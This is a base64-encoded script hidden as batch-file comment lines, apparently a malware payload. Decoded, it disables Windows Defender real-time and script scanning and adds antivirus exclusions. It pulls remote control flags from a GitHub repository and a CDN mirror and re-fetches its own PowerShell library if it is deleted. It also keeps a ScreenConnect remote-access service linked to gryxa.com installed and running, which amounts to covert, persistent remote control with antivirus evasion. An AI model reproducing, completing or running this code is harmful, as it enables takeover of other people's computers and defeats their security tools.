::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUHJv
::Y2Vzc2VzIiAvdiAibXNpZXhlYy5leGUiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
::dWwgMj4mMQ0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiJEVycm9yQWN0aW9uUHJl
::ZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7IHRyeXtTZXQtTXBQcmVmZXJlbmNl
::IC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlfWNhdGNoe307IHRyeXtT
::ZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWV9Y2F0
::Y2h7fTsgdHJ5e0FkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyVXRCUn
::LCclRVRMJScsKEpvaW4tUGF0aCAkZW52OlByb2dyYW1GaWxlcyAnU2NyZWVuQ29u
::bmVjdCBDbGllbnQqJyksKEpvaW4tUGF0aCAke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpIC1FcnJvckFjdGlvbiBTdG9wfWNh
::dGNoe307IGZvcmVhY2goJHggaW4gQCgnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2
::aWNlLmV4ZScsJ1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnLCdtc2ll
::eGVjLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJykpe3RyeXtBZGQtTXBQcmVmZXJlbmNl
::IC1FeGNsdXNpb25Qcm9jZXNzICR4IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlfWNhdGNoe319IiA+bnVsIDI+JjENCg0KcmVtIOKUgOKUgCBbR10gcGVyaW9k
::aWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIgaCDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCnBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChU
::ZXN0LVBhdGggJyVXRCVcb3duX3NlY3VyZS5jbWQnKSAtYW5kICgoIC1ub3QgKFRl
::c3QtUGF0aCAnJVdEJVxzZWMuZmxhZycpKSAtb3IgKCgoR2V0LURhdGUpIC0gKEdl
::dC1JdGVtIC1MaXRlcmFsUGF0aCAnJVdEJVxzZWMuZmxhZycpLkxhc3RXcml0ZVRp
::bWUpLlRvdGFsSG91cnMgLWdlIDIpKSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAg
::fSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIHBlcmlvZGlj
::IHJlLXNlY3VyZT4+IiVMT0clIg0KICBjYWxsICIlV0QlXG93bl9zZWN1cmUuY21k
::IiA+PiIlTE9HJSIgMj4mMQ0KICBlY2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciDQop
::DQoNCnJlbSDilIDilIAgW0cyXSBHcnl4YSBNVVNULVJVTiDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIANCnJlbSBPNDA6IGlmIEFOWSBub24tc2V2cnogU0MgUnVubmluZyDi
::hpIgbmV2ZXIgbXNpZXhlYyAoc3RvcHMgcGFuZWwgZHVwbGljYXRlcykuDQpzZXQg
::IkdSWVhBX09LPTAiDQpzZXQgIkdSWVhBX1dBUz0wIg0Kc2V0ICJET19ERUVQPTAi
::DQpzZXQgIkZPUkNFX0c9MCINCnNldCAiT0JTRVJWRT0wIg0KaWYgZXhpc3QgIiVX
::RCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1z
::PT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJD
::VVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCg0KcmVtIE02MDogb2JzZXJ2
::ZS5mbGFnIGZyb20gcmVwbyDigJQgZmxlZXQtd2lkZSBmcmVlemUgb2YgaGVhbC9m
::b3JjZSBzbyB3ZSBjYW4gc2VlIHJlYWwgZHJvcCBjYXVzZQ0KIiVDVVJMJSIgLUwg
::LS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAx
::NSAtbyAiJVdEJVxvYnNlcnZlLm5ldyIgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJj
::b250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL29ic2VydmUuZmxh
::Zz90PSVSQU5ET00lJVJBTkRPTSUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVc
::b2JzZXJ2ZS5uZXciICgNCiAgZmluZHN0ciAvSSAvQzoiT0JTRVJWRSIgIiVXRCVc
::b2JzZXJ2ZS5uZXciID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgN
::CiAgICBzZXQgIk9CU0VSVkU9MSINCiAgICBjb3B5IC95ICIlV0QlXG9ic2VydmUu
::bmV3IiAiJVdEJVxvYnNlcnZlLmZsYWciID5udWwgMj4mMQ0KICApIGVsc2UgKA0K
::ICAgIGRlbCAvZiAvcSAiJVdEJVxvYnNlcnZlLmZsYWciID5udWwgMj4mMQ0KICAp
::DQopDQppZiBleGlzdCAiJVdEJVxvYnNlcnZlLmZsYWciIHNldCAiT0JTRVJWRT0x
::Ig0KaWYgIiFPQlNFUlZFISI9PSIxIiBlY2hvIGdyeXhhX09CU0VSVkVfbW9kZV9u
::b19oZWFsX25vX2ZvcmNlPj4iJUxPRyUiDQpyZW0gcm90YXRlIG9sZCBncnl4YSB1
::bmluc3RhbGwgZXZpZGVuY2Ugc28gZGlhZyBWRVJESUNUIGlzIG5vdCBmb3JldmVy
::IE9VUl9HUllYQV9VTklOU1RBTEwNCmlmICIhT0JTRVJWRSEiPT0iMSIgaWYgZXhp
::c3QgIiVXRCVcb3duX2dyeXhhLmxvZyIgaWYgbm90IGV4aXN0ICIlV0QlXG93bl9n
::cnl4YS5sb2cucHJlX29ic2VydmUiICgNCiAgbW92ZSAveSAiJVdEJVxvd25fZ3J5
::eGEubG9nIiAiJVdEJVxvd25fZ3J5eGEubG9nLnByZV9vYnNlcnZlIiA+bnVsIDI+
::JjENCiAgZWNobyBncnl4YV9sb2dfcm90YXRlZF9wcmVfb2JzZXJ2ZT4+IiVMT0cl
::Ig0KKQ0KDQpyZW0gRk9SQ0UgcHVzaDogY29udGVudC1oYXNoIHZpYSBmYyAvYiAo
::cmUtZmlyZSB3aGVuIGZsYWcgY29udGVudCBjaGFuZ2VzKTsgcmF3LWZpcnN0DQoi
::JUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgNiAt
::LW1heC10aW1lIDIwIC1vICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIgImh0dHBzOi8v
::cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
::YWluL2ZvcmNlX2dyeXhhLmZsYWc/dD0lUkFORE9NJSVSQU5ET00lIiA+bnVsIDI+
::JjENCmlmIG5vdCBleGlzdCAiJVdEJVxmb3JjZV9ncnl4YS5uZXciICIlQ1VSTCUi
::IC1MIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVdEJVxm
::b3JjZV9ncnl4YS5uZXciICJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5v
::YnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9mb3JjZV9ncnl4YS5mbGFnP3Q9JVJBTkRP
::TSUlUkFORE9NJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxmb3JjZV9ncnl4
::YS5uZXciICgNCiAgZmluZHN0ciAvQzoiUFVTSCIgIiVXRCVcZm9yY2VfZ3J5eGEu
::bmV3IiA+bnVsIDI+JjENCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgaWYg
::bm90IGV4aXN0ICIlV0QlXGZvcmNlX2dyeXhhLmRvbmUiICgNCiAgICAgIHNldCAi
::Rk9SQ0VfRz0xIg0KICAgICkgZWxzZSAoDQogICAgICBmYyAvYiAiJVdEJVxmb3Jj
::ZV9ncnl4YS5uZXciICIlV0QlXGZvcmNlX2dyeXhhLmRvbmUiID5udWwgMj4mMQ0K
::ICAgICAgaWYgZXJyb3JsZXZlbCAxIHNldCAiRk9SQ0VfRz0xIg0KICAgICkNCiAg
::KQ0KKQ0KaWYgIiFPQlNFUlZFISI9PSIxIiBzZXQgIkZPUkNFX0c9MCINCg0KcmVt
::IERldGVjdCBHcnl4YSDigJQgQ01EIGZpcnN0IChBTVNJLXByb29mKS4gT25seSB0
::cnVzdCBQUyBoZWFsdGggaWYgbGluZSBzdGFydHMgd2l0aCBIRUFMVEhZfEJST0tF
::TnxTVFVDS3xBQlNFTlR8DQpzZXQgIkdIPSINCnNjIHF1ZXJ5ICJTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZHN0ciAvSSAvQzoiUlVOTklO
::RyIgL0M6IlNUQVJUX1BFTkRJTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEg
::KA0KICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNl
::cnZpY2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgL3YgSW1h
::Z2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQogIGlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIHNldCAiR1JZWEFfT0s9MSINCiAgICBz
::ZXQgIkdSWVhBX1dBUz0xIg0KICAgIHNldCAiR0g9SEVBTFRIWXwlR1JZWEFfRlAl
::fGNtZC1zYy1yZWxheSINCiAgKQ0KKQ0KaWYgIiFHUllYQV9PSyEiPT0iMCIgKA0K
::ICBmb3IgL2YgInRva2Vucz0yIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkg
::c3RhdGVePSBhbGwgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3JlZW5D
::b25uZWN0IENsaWVudCInKSBkbyAoDQogICAgc2V0ICJfRlA9JSVhIg0KICAgIHNl
::dCAiX0ZQPSFfRlA6ID0hIg0KICAgIGlmIC9JIG5vdCAiIV9GUCEiPT0iJUtFRVBf
::RlAlIiBpZiAvSSBub3QgIiFfRlAhIj09IiVBTFRfRlAlIiAoDQogICAgICBzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgfCBmaW5kc3RyIC9J
::IC9DOiJSVU5OSU5HIiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0KICAgICAgaWYg
::bm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgIHJlZyBxdWVyeSAiSEtMTVxTWVNU
::RU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCFfRlAhKSIgL3YgSW1hZ2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAiZ3J5
::eGEuY29tIiA+bnVsDQogICAgICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAg
::ICAgICAgIHNldCAiR1JZWEFfT0s9MSINCiAgICAgICAgICBzZXQgIkdSWVhBX1dB
::Uz0xIg0KICAgICAgICAgIHNldCAiR1JZWEFfRlA9IV9GUCEiDQogICAgICAgICAg
::c2V0ICJHSD1IRUFMVEhZfCFfRlAhfGNtZC1zYy1yZWxheSINCiAgICAgICAgKQ0K
::ICAgICAgKQ0KICAgICkNCiAgKQ0KKQ0KaWYgIiFHUllYQV9PSyEiPT0iMCIgaWYg
::ZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9m
::aWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
::ZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBncnl4YS1oZWFsdGggLVdvcmtE
::aXIgIiVXRCUiID4iJVdEJVxncnl4YV9oZWFsdGgub3V0IiAyPm51bA0KICBpZiBl
::eGlzdCAiJVdEJVxncnl4YV9oZWFsdGgub3V0IiBmb3IgL2YgInVzZWJhY2txIGRl
::bGltcz0iICUlUiBpbiAoIiVXRCVcZ3J5eGFfaGVhbHRoLm91dCIpIGRvIHNldCAi
::R0g9JSVSIg0KICBlY2hvICFHSCF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFl8
::IiAvQzoiQlJPS0VOfCIgL0M6IlNUVUNLfCIgL0M6IkFCU0VOVHwiID5udWwNCiAg
::aWYgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIGdyeXhhX2hlYWx0aF9hbXNpX29y
::X2dhcmJhZ2UgaWdub3JlZD4+IiVMT0clIg0KICAgIHNldCAiR0g9VU5UUlVTVEVE
::fGFtc2kiDQogICkgZWxzZSAoDQogICAgZWNobyAhR0ghfCBmaW5kc3RyIC9JIC9C
::IC9DOiJIRUFMVEhZfCIgPm51bA0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0K
::ICAgICAgc2V0ICJHUllYQV9PSz0xIg0KICAgICAgc2V0ICJHUllYQV9XQVM9MSIN
::CiAgICApDQogICkNCikNCmVjaG8gZ3J5eGFfaGVhbHRoPSFHSCE+PiIlTE9HJSIN
::Cg0KcmVtIEZPUkNFIHB1c2g6IG5ldmVyIC94IGEgbGl2ZSBHdWVzdCDigJQgYWNr
::IGlmIGFscmVhZHkgaGVhbHRoeTsgUkVJTlNUQUxMIG9ubHkgd2hlbiBhYnNlbnQN
::CmlmICIlRk9SQ0VfRyUiPT0iMSIgKA0KICBpZiAiIU9CU0VSVkUhIj09IjEiICgN
::CiAgICBlY2hvIGdyeXhhX2ZvcmNlX3N1cHByZXNzZWRfT0JTRVJWRT4+IiVMT0cl
::Ig0KICAgIGlmIGV4aXN0ICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIgY29weSAveSAi
::JVdEJVxmb3JjZV9ncnl4YS5uZXciICIlV0QlXGZvcmNlX2dyeXhhLmRvbmUiID5u
::dWwgMj4mMQ0KICAgIGdvdG8gOkdyeXhhQWZ0ZXINCiAgKQ0KICBpZiAiIUdSWVhB
::X09LISI9PSIxIiAoDQogICAgZWNobyBncnl4YV9mb3JjZV9za2lwX2FscmVhZHlf
::aGVhbHRoeT4+IiVMT0clIg0KICApIGVsc2UgKA0KICAgIHNjIHF1ZXJ5ICJTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KICAgIGlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgZWNobyBncnl4YV9mb3JjZV9za2lw
::X3N2Y19leGlzdHNfc3RhcnRfb25seT4+IiVMT0clIg0KICAgICAgc2MgY29uZmln
::ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0KICAgICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQogICAgKSBlbHNlICgNCiAgICAgIGVj
::aG8gZ3J5eGFfZm9yY2VfcHVzaF9yZWluc3RhbGxfMTA2MF9vbmx5Pj4iJUxPRyUi
::DQogICAgICBjYWxsIDpRdWV1ZUdyeXhhSGVhbCBSRUlOU1RBTEwNCiAgICApDQog
::ICkNCiAgaWYgZXhpc3QgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiBjb3B5IC95ICIl
::V0QlXGZvcmNlX2dyeXhhLm5ldyIgIiVXRCVcZm9yY2VfZ3J5eGEuZG9uZSIgPm51
::bCAyPiYxDQogIGdvdG8gOkdyeXhhQWZ0ZXINCikNCg0KcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKCAtbm90IChUZXN0
::LVBhdGggJyVHUllYQV9ERUVQJScpKSAtb3IgKCgoR2V0LURhdGUpLShHZXQtSXRl
::bSAtTGl0ZXJhbFBhdGggJyVHUllYQV9ERUVQJScgLUZvcmNlKS5MYXN0V3JpdGVU
::aW1lKS5Ub3RhbEhvdXJzIC1nZSA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAg
::fSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgc2V0ICJET19ERUVQPTEiDQoN
::CnJlbSBIZWFsdGh5ICsgbm90IGRlZXAgZHVlIOKGkiBzdGlsbCB2ZXJpZnkgSW1h
::Z2VQYXRoIGhhcyBncnl4YS5jb20gKGJhcmUgc2MgY3JlYXRlID0gZmFsc2UgaGVh
::bHRoeSkNCmlmICIhR1JZWEFfT0shIj09IjEiICgNCiAgcmVnIHF1ZXJ5ICJIS0xN
::XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTY3JlZW5Db25uZWN0
::IENsaWVudCAoJUdSWVhBX0ZQJSkiIC92IEltYWdlUGF0aCAyPm51bCB8IGZpbmRz
::dHIgL0kgImdyeXhhLmNvbSIgPm51bA0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAg
::IHNldCAiR1JZWEFfT0s9MCINCiAgICBmb3IgL2YgInRva2Vucz0yIGRlbGltcz0o
::KSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmluZHN0ciAvQzoi
::U0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBkbyAoDQogICAg
::ICBzZXQgIl9GUD0lJWEiDQogICAgICBzZXQgIl9GUD0hX0ZQOiA9ISINCiAgICAg
::IGlmIC9JIG5vdCAiIV9GUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFfRlAh
::Ij09IiVBTFRfRlAlIiAoDQogICAgICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
::IENsaWVudCAoIV9GUCEpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJT
::VEFSVF9QRU5ESU5HIiA+bnVsDQogICAgICAgIGlmIG5vdCBlcnJvcmxldmVsIDEg
::KA0KICAgICAgICAgIHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRy
::b2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgL3Yg
::SW1hZ2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQog
::ICAgICAgICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgICAgICBzZXQg
::IkdSWVhBX09LPTEiDQogICAgICAgICAgICBzZXQgIkdSWVhBX0ZQPSFfRlAhIg0K
::ICAgICAgICAgICkNCiAgICAgICAgKQ0KICAgICAgKQ0KICAgICkNCiAgICBpZiAi
::IUdSWVhBX09LISI9PSIwIiBlY2hvIGdyeXhhX3J1bm5pbmdfbm9fcmVsYXk+PiIl
::TE9HJSINCiAgKQ0KKQ0KDQppZiAiIUdSWVhBX09LISI9PSIxIiBpZiAiJURPX0RF
::RVAlIj09IjAiICgNCiAgZWNobyBncnl4YV9za2lwX2FscmVhZHlfaGVhbHRoeT4+
::IiVMT0clIg0KICBnb3RvIDpHcnl4YUFmdGVyDQopDQoNCnJlbSByZXN0b3JlIGxp
::YiBpZiBBVi9BTVNJIGRlbGV0ZWQgaXQgKGNtZC1vbmx5KQ0KaWYgbm90IGV4aXN0
::ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGVjaG8gZ3J5eGFfbGliX21pc3Npbmdf
::cmVmZXRjaD4+IiVMT0clIg0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGlj
::aWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0
::aW9uIiAvdiBEaXNhYmxlU2NyaXB0U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEg
::L2YgPm51bCAyPiYxDQogIHJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0
::XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUiIC90
::IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KICAiJUNVUkwlIiAtTCAtLXNz
::bC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1v
::ICIlV0QlXG93bl9saWIucHMxIiAiJU9XTkxJQiUiID5udWwgMj4mMQ0KKQ0KDQpy
::ZW0gTTUyIEZSRUVaRSArIFNUVUNLLUhFQUw6IHN0YXJ0LW9ubHkgd2hlbiBwb3Nz
::aWJsZTsgcXVldWUgRzcgaGVhbCB3aGVuIDEwNjArZGlyIG9yIG5vLXJlbGF5DQpp
::ZiBleGlzdCAiJVdEJVxncnl4YV9pbnN0YWxsLmNtZCIgZGVsIC9mIC9xICIlV0Ql
::XGdyeXhhX2luc3RhbGwuY21kIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXGdy
::eXhhX21zaS5sb2NrIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUNvbW1hbmQgImlmKCgoR2V0LURhdGUpLShHZXQtSXRlbSAnJVdE
::JVxncnl4YV9tc2kubG9jaycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAt
::Z3QgMjUpe1JlbW92ZS1JdGVtICclV0QlXGdyeXhhX21zaS5sb2NrJyAtRm9yY2V9
::IiA+bnVsIDI+JjENCikNCmlmICIhR1JZWEFfT0shIj09IjAiICgNCiAgZWNobyBn
::cnl4YV9tb25fc3RhcnRfb25seT4+IiVMT0clIg0KICBzYyBjb25maWcgIlNjcmVl
::bkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgc3RhcnQ9IGF1dG8gPm51bCAy
::PiYxDQogIHNjIGZhaWx1cmUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFf
::RlAlKSIgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0
::LzMwMDAvcmVzdGFydC8zMDAwID5udWwgMj4mMQ0KICBzYyBzdGFydCAiU2NyZWVu
::Q29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgdGltZW91
::dCAvdCAxMiAvbm9icmVhayA+bnVsDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0
::IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDUg
::L25vYnJlYWsgPm51bA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
::KCVHUllYQV9GUCUpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJTVEFS
::VF9QRU5ESU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIHJl
::ZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNc
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiAvdiBJbWFnZVBhdGgg
::Mj5udWwgfCBmaW5kc3RyIC9JICJncnl4YS5jb20iID5udWwNCiAgICBpZiBub3Qg
::ZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCiAgKQ0KICByZW0gTTUzOiBz
::ZXJ2aWNlIGV4aXN0cyBTVE9QUEVEIHdpdGggcmVsYXkg4oaSIHN0YXJ0LW9ubHks
::IGRvIE5PVCByZWluc3RhbGwNCiAgaWYgIiFHUllYQV9PSyEiPT0iMCIgKA0KICAg
::IHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5u
::dWwgMj4mMQ0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgcmVnIHF1
::ZXJ5ICJIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIC92IEltYWdlUGF0aCAyPm51
::bCB8IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIgPm51bA0KICAgICAgaWYgbm90IGVy
::cm9ybGV2ZWwgMSAoDQogICAgICAgIGVjaG8gZ3J5eGFfc3RvcHBlZF9yZWxheV9z
::dGFydF9yZXRyeT4+IiVMT0clIg0KICAgICAgICBzYyBzdGFydCAiU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgICAgICAgdGlt
::ZW91dCAvdCAxMCAvbm9icmVhayA+bnVsDQogICAgICAgIHNjIHF1ZXJ5ICJTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZHN0ciAvSSAvQzoi
::UlVOTklORyIgL0M6IlNUQVJUX1BFTkRJTkciID5udWwNCiAgICAgICAgaWYgbm90
::IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQogICAgICAgIGlmICIhR1JZ
::WEFfT0shIj09IjAiIGVjaG8gZ3J5eGFfc3RvcHBlZF9yZWxheV9zdGlsbF9kb3du
::X25vX2hlYWw+PiIlTE9HJSINCiAgICAgICkNCiAgICApDQogICkNCiAgaWYgIiFH
::UllYQV9PSyEiPT0iMCIgKA0KICAgIGZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgp
::IiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJT
::RVJWSUNFX05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgICAg
::IHNldCAiX0ZQPSUlYSINCiAgICAgIHNldCAiX0ZQPSFfRlA6ID0hIg0KICAgICAg
::aWYgL0kgbm90ICIhX0ZQISI9PSIlS0VFUF9GUCUiIGlmIC9JIG5vdCAiIV9GUCEi
::PT0iJUFMVF9GUCUiICgNCiAgICAgICAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3Qg
::Q2xpZW50ICghX0ZQISkiIHwgZmluZHN0ciAvSSAvQzoiUlVOTklORyIgL0M6IlNU
::QVJUX1BFTkRJTkciID5udWwNCiAgICAgICAgaWYgbm90IGVycm9ybGV2ZWwgMSAo
::DQogICAgICAgICAgcmVnIHF1ZXJ5ICJIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJv
::bFNldFxTZXJ2aWNlc1xTY3JlZW5Db25uZWN0IENsaWVudCAoIV9GUCEpIiAvdiBJ
::bWFnZVBhdGggMj5udWwgfCBmaW5kc3RyIC9JICJncnl4YS5jb20iID5udWwNCiAg
::ICAgICAgICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICAgICAgICAgIHNldCAi
::R1JZWEFfT0s9MSINCiAgICAgICAgICAgIHNldCAiR1JZWEFfRlA9IV9GUCEiDQog
::ICAgICAgICAgKQ0KICAgICAgICApDQogICAgICApDQogICAgKQ0KICApDQopDQoN
::CnJlbSBoZWFsIE9OTFkgb24gaGFyZCAxMDYwIChzZXJ2aWNlIG1pc3NpbmcpLiBO
::ZXZlciBtc2lleGVjIHdoaWxlIHN2YyBleGlzdHMuDQpzZXQgIk5FRURfSEVBTD0w
::Ig0KaWYgIiFPQlNFUlZFISI9PSIxIiAoDQogIGVjaG8gZ3J5eGFfb2JzZXJ2ZV9o
::ZWFsX2FsbG93ZWRfbm9fcmVpbnN0YWxsIEdSWVhBX09LPSFHUllYQV9PSyE+PiIl
::TE9HJSINCiAgZWNobyAlREFURSUgJVRJTUUlIG9ic2VydmUgb2s9IUdSWVhBX09L
::ISBmcD0lR1JZWEFfRlAlIGdoPSFHSCE+PiIlV0QlXGRyb3BfdHJhY2UubG9nIg0K
::KQ0KaWYgIiFHUllYQV9PSyEiPT0iMCIgKA0KICBzYyBxdWVyeSAiU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgaWYgZXJyb3Js
::ZXZlbCAxICgNCiAgICBzZXQgIk5FRURfSEVBTD0xIg0KICAgIGVjaG8gZ3J5eGFf
::MTA2MF9xdWV1ZV9oZWFsPj4iJUxPRyUiDQogICkgZWxzZSAoDQogICAgZWNobyBn
